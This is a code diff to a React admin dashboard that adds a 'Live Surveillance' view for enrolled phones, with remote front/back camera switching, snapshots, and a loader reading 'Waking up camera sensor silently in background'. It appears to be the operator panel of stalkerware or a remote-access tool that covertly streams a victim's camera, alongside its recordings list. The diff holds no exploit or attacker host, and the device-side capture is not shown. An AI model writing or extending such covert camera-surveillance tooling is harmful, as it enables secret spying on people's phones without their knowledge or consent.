@@ -1,4 +1,5 @@
-import React, { useState, useEffect } from 'react';
+import React, { useState, useEffect, useRef } from 'react';
+import { io } from 'socket.io-client';
 import {
   Eye,
   Smartphone,
@@ -46,6 +47,16 @@ export default function App() {
   const [searchQuery, setSearchQuery] = useState('');
   const [selectedRecordings, setSelectedRecordings] = useState([]);
   const [isDeleting, setIsDeleting] = useState(false);
+
+  // Live Camera Surveillance State
+  const [socket, setSocket] = useState(null);
+  const [onlineSocketDevices, setOnlineSocketDevices] = useState(new Set());
+  const [liveDevice, setLiveDevice] = useState(null);
+  const [liveFrame, setLiveFrame] = useState(null);
+  const [liveLens, setLiveLens] = useState('BACK');
+  const [liveFps, setLiveFps] = useState(0);
+  const [isLiveConnecting, setIsLiveConnecting] = useState(false);
+  const frameCountRef = useRef(0);
 
   // Fetch all dashboard data
   const fetchData = async () => {
@@ -100,6 +111,108 @@ export default function App() {
     }, 30000);
     return () => clearInterval(interval);
   }, [autoRefresh]);
+
+  // Connect to Socket.io for Real-Time Camera Streaming & Remote Controls
+  useEffect(() => {
+    const s = io(API_BASE_URL, {
+      transports: ['websocket', 'polling'],
+      reconnectionAttempts: 20,
+      reconnectionDelay: 2000,
+    });
+
+    s.on('connect', () => {
+      console.log('⚡ Admin connected to real-time socket');
+      s.emit('register-admin');
+    });
+
+    s.on('online-devices-list', (list) => {
+      setOnlineSocketDevices(new Set(list));
+    });
+
+    s.on('device-status-change', ({ deviceId, isOnline }) => {
+      setOnlineSocketDevices((prev) => {
+        const next = new Set(prev);
+        if (isOnline) next.add(deviceId);
+        else next.delete(deviceId);
+        return next;
+      });
+      fetchData();
+    });
+
+    s.on('live-frame', (data) => {
+      if (data && data.frame) {
+        setLiveFrame(`data:image/jpeg;base64,${data.frame}`);
+        setIsLiveConnecting(false);
+        frameCountRef.current += 1;
+      }
+    });
+
+    s.on('stream-error', (err) => {
+      alert(`Live stream error: ${err.error || 'Device unavailable'}`);
+      setIsLiveConnecting(false);
+      setLiveDevice(null);
+    });
+
+    s.on('stream-ended', () => {
+      setIsLiveConnecting(false);
+      setLiveDevice(null);
+      setLiveFrame(null);
+    });
+
+    setSocket(s);
+
+    const fpsInterval = setInterval(() => {
+      setLiveFps(frameCountRef.current);
+      frameCountRef.current = 0;
+    }, 1000);
+
+    return () => {
+      clearInterval(fpsInterval);
+      s.disconnect();
+    };
+  }, []);
+
+  // Live Stream Handlers
+  const handleStartLiveStream = (device) => {
+    setLiveDevice(device);
+    setLiveFrame(null);
+    setLiveLens('BACK');
+    setIsLiveConnecting(true);
+    if (socket) {
+      socket.emit('request-live-stream', {
+        deviceId: device.deviceId,
+        camera: 'BACK',
+      });
+    }
+  };
+
+  const handleStopLiveStream = () => {
+    if (socket && liveDevice) {
+      socket.emit('stop-watching-device', { deviceId: liveDevice.deviceId });
+    }
+    setLiveDevice(null);
+    setLiveFrame(null);
+    setIsLiveConnecting(false);
+  };
+
+  const handleSwitchCamera = () => {
+    const nextLens = liveLens === 'BACK' ? 'FRONT' : 'BACK';
+    setLiveLens(nextLens);
+    if (socket && liveDevice) {
+      socket.emit('switch-camera', {
+        deviceId: liveDevice.deviceId,
+        camera: nextLens,
+      });
+    }
+  };
+
+  const handleTakeSnapshot = () => {
+    if (!liveFrame) return;
+    const a = document.createElement('a');
+    a.href = liveFrame;
+    a.download = `snapshot_${liveDevice?.deviceId || 'live'}_${Date.now()}.jpg`;
+    a.click();
+  };
 
   // Toggle selection for a recording
   const toggleSelectRecording = (id) => {
@@ -527,6 +640,7 @@ export default function App() {
                           <th>Status</th>
                           <th>Last Active</th>
                           <th>Recordings</th>
+                          <th>Live View</th>
                         </tr>
                       </thead>
                       <tbody>
@@ -615,6 +729,16 @@ export default function App() {
                               </td>
                               <td>{formatTimeAgo(d.lastSeen)}</td>
                               <td style={{ fontWeight: 600, color: '#fff' }}>{d.totalRecordings || 0}</td>
+                              <td>
+                                <button
+                                  className="btn-live-cam"
+                                  onClick={() => handleStartLiveStream(d)}
+                                  title="Watch live camera feed"
+                                >
+                                  <Radio size={13} className="live-icon-pulsing" />
+                                  <span>Live Camera</span>
+                                </button>
+                              </td>
                             </tr>
                           );
                         })}
@@ -757,13 +881,23 @@ export default function App() {
                             <td>{formatTimeAgo(d.lastSeen)}</td>
                             <td style={{ fontWeight: 700, color: 'var(--cyan)' }}>{d.totalRecordings || 0}</td>
                             <td>
-                              <button
-                                className="btn-action delete"
-                                onClick={() => handleDeleteDevice(d.deviceId)}
-                                title="Remove Device"
-                              >
-                                <Trash2 size={14} />
-                              </button>
+                              <div style={{ display: 'flex', gap: '8px', alignItems: 'center' }}>
+                                <button
+                                  className="btn-live-cam"
+                                  onClick={() => handleStartLiveStream(d)}
+                                  title="Watch live camera feed"
+                                >
+                                  <Radio size={13} className="live-icon-pulsing" />
+                                  <span>Live View</span>
+                                </button>
+                                <button
+                                  className="btn-action delete"
+                                  onClick={() => handleDeleteDevice(d.deviceId)}
+                                  title="Remove Device"
+                                >
+                                  <Trash2 size={14} />
+                                </button>
+                              </div>
                             </td>
                           </tr>
                         );
@@ -1123,6 +1257,104 @@ export default function App() {
               >
                 <Download size={14} /> Download
               </a>
+            </div>
+          </div>
+        </div>
+      )}
+
+      {/* Real-Time Live Surveillance Modal */}
+      {liveDevice && (
+        <div className="modal-overlay" onClick={handleStopLiveStream}>
+          <div className="live-modal-content" onClick={(e) => e.stopPropagation()}>
+            <div className="live-modal-header">
+              <div className="live-header-info">
+                <div className="live-pulsing-badge">
+                  <span className="live-indicator-dot" />
+                  <span>LIVE SURVEILLANCE</span>
+                </div>
+                <h3>{liveDevice.deviceName || liveDevice.model}</h3>
+                <div className="live-submeta">
+                  <span>ID: {liveDevice.deviceId}</span>
+                  <span>&bull;</span>
+                  <span>Lens: {liveLens} CAMERA</span>
+                  <span>&bull;</span>
+                  <span style={{ color: liveFps > 0 ? 'var(--emerald)' : 'var(--amber)', fontWeight: 600 }}>
+                    {liveFps > 0 ? `${liveFps} FPS` : 'Connecting...'}
+                  </span>
+                </div>
+              </div>
+
+              <div className="live-header-actions">
+                <button
+                  className="btn-live-control"
+                  onClick={handleSwitchCamera}
+                  title="Switch between Front and Back camera"
+                >
+                  <RefreshCw size={13} />
+                  <span>Switch Lens ({liveLens === 'BACK' ? 'Front' : 'Back'})</span>
+                </button>
+
+                <button
+                  className="btn-live-control"
+                  onClick={handleTakeSnapshot}
+                  disabled={!liveFrame}
+                  title="Capture & download current frame"
+                >
+                  <Download size={13} />
+                  <span>Snapshot</span>
+                </button>
+
+                <button
+                  className="close-modal-btn"
+                  onClick={handleStopLiveStream}
+                  title="Stop Live Stream"
+                >
+                  <X size={20} />
+                </button>
+              </div>
+            </div>
+
+            {/* Live Video Viewport */}
+            <div className="live-feed-viewport">
+              {liveFrame ? (
+                <img
+                  src={liveFrame}
+                  alt="Live Camera Feed"
+                  className="live-video-stream"
+                />
+              ) : (
+                <div className="live-feed-loader">
+                  <div className="live-radar-spinner" />
+                  <p>Connecting to {liveDevice.deviceName}&apos;s camera...</p>
+                  <span>Waking up camera sensor silently in background...</span>
+                </div>
+              )}
+
+              {/* Live HUD Overlay */}
+              {liveFrame && (
+                <div className="live-hud-overlay">
+                  <div className="hud-top-left">
+                    <span className="hud-rec-dot" />
+                    <span>REC &bull; {liveLens}</span>
+                  </div>
+                  <div className="hud-bottom-right">
+                    <span>{new Date().toLocaleTimeString()}</span>
+                  </div>
+                </div>
+              )}
+            </div>
+
+            <div className="live-modal-footer">
+              <div className="live-footer-note">
+                <Info size={14} color="var(--cyan)" />
+                <span>Streamed live via direct WebSocket packets. Zero server video storage used.</span>
+              </div>
+              <button
+                className="btn-end-live"
+                onClick={handleStopLiveStream}
+              >
+                End Live View
+              </button>
             </div>
           </div>
         </div>
